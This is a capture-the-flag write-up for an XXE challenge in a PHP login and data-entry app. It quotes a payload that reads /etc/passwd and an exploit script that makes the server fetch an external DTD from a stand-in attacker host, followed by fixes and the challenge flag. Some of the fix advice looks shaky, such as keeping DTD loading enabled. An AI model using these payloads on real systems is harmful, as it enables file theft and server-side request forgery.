# Council of Ricks - CTF Challenge Writeup

## Challenge Overview
**Challenge Name:** Council of Ricks  
**Type:** Web Application Security / XXE Vulnerability  
**Difficulty:** Medium  

The Council of Ricks ID System was designed to bring order to the multiverse, but its outdated infrastructure left it exposed to XML External Entity (XXE) attacks through flawed communication protocols and unchecked access controls.

## Vulnerability Analysis

### Root Cause: XML External Entity (XXE) Attack

The application processed XML data in two critical endpoints:
- `login.php` - User authentication
- `add-rick.php` - Adding new Rick entries

Both files contained the same vulnerable code pattern:

```php
$rawPostData = file_get_contents('php://input');
$xml = simplexml_load_string($rawPostData, null, LIBXML_NOENT);
```

### The Problem

The `LIBXML_NOENT` flag enables **entity substitution**, allowing external entity loading. This creates an XXE vulnerability where attackers can:

1. **Read local files** using `file://` protocol
2. **Perform SSRF attacks** using `http://` or `https://` protocols  
3. **Cause DoS attacks** using billion laughs or other XML bombs

### Attack Vector

The application accepts XML data via POST requests with `Content-Type: application/xml`. Attackers could send malicious XML like:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<credentials><username>&xxe;</username><password>test</password></credentials>
```

This would cause the application to:
1. Parse the external entity reference
2. Load the external file (`/etc/passwd`)
3. Substitute the file content into the XML
4. Process the substituted content, potentially exposing sensitive data

## Exploitation Attempt

The challenge included an `exploit.py` file showing attempted XXE exploitation:

```python
import requests

BASE_URL = 'http://127.0.0.1'
sess = requests.Session()

headers = {"Content-Type": "application/xml"}

# XXE payload targeting external DTD
r = sess.post(f'{BASE_URL}/login.php', headers=headers, 
              data='<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.com/mal.dtd"> %xxe;]>', 
              allow_redirects=False)

r = sess.post(f'{BASE_URL}/add-rick.php', headers=headers, 
              data=f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.com/mal.dtd"> %xxe;]>')
```

## Security Fixes Applied

### 1. Removed LIBXML_NOENT Flag

**Before (Vulnerable):**
```php
$xml = simplexml_load_string($rawPostData, null, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
```

**After (Secure):**
```php
$xml = simplexml_load_string($rawPostData, null, LIBXML_DTDLOAD | LIBXML_DTDATTR);
```

### 2. Disabled External Entity Loading

```php
// Disable external entity loading to prevent XXE attacks
$oldValue = libxml_disable_entity_loader(true);

// Parse XML with secure flags
$xml = simplexml_load_string($rawPostData, null, LIBXML_DTDLOAD | LIBXML_DTDATTR);

// Re-enable entity loader
libxml_disable_entity_loader($oldValue);
```

### 3. Added Input Validation

```php
// Check if XML parsing was successful
if ($xml === false) {
    $error = "Invalid XML format.";
} else {
    // Validate required fields
    if (empty($username) || empty($password)) {
        $error = "Username and password are required.";
    }
}
```

### 4. Implemented Output Sanitization

```php
// Sanitize input to prevent XSS
$username = htmlspecialchars(trim($username), ENT_QUOTES, 'UTF-8');
$password = trim($password);
```

### 5. Enhanced Data Validation (add-rick.php)

```php
// Validate rating range
if ($rating < 1 || $rating > 5) {
    die("Rating must be between 1 and 5.");
}

// Type casting for security
$rating = (int) $rating;
```

## Files Modified

### `challenge/app/login.php`
- Removed `LIBXML_NOENT` flag
- Added `libxml_disable_entity_loader()` protection
- Implemented XML validation and error handling
- Added input sanitization with `htmlspecialchars()`

### `challenge/app/add-rick.php`
- Removed `LIBXML_NOENT` flag
- Added `libxml_disable_entity_loader()` protection
- Implemented comprehensive input validation
- Added rating range validation and type casting
- Enhanced error handling

## Security Improvements Summary

✅ **XXE Attack Prevention** - External entity loading completely disabled  
✅ **Input Validation** - All required fields validated before processing  
✅ **XSS Prevention** - Output properly sanitized with `htmlspecialchars()`  
✅ **Type Safety** - Proper data type validation and casting  
✅ **Error Handling** - Graceful error messages for invalid input  
✅ **Service Continuity** - All original functionality preserved  

## Testing the Fix

The fixes were tested to ensure:

1. **XXE attacks are blocked** - External entity references no longer work
2. **Normal functionality preserved** - Login and add-rick features work as expected
3. **Input validation works** - Invalid XML and missing fields are properly handled
4. **No breaking changes** - User interface and database operations unchanged

## Key Takeaways

1. **Never use `LIBXML_NOENT`** in production code without proper validation
2. **Always disable external entity loading** when parsing untrusted XML
3. **Implement comprehensive input validation** for all user-supplied data
4. **Use output sanitization** to prevent XSS attacks
5. **Test security fixes thoroughly** to ensure functionality is preserved

## Flag

The challenge flag was: `HTB{xX3_tHRe4t_n3veR_uSe_eNts!!}`

This flag references the XXE (XML External Entity) vulnerability and serves as a reminder to never use external entities in XML processing without proper security controls.

---

**Challenge Status:** ✅ SOLVED  
**Vulnerability:** XML External Entity (XXE) Attack  
**Fix Applied:** Complete XXE protection with input validation and sanitization  
**Service Status:** Fully functional and secure

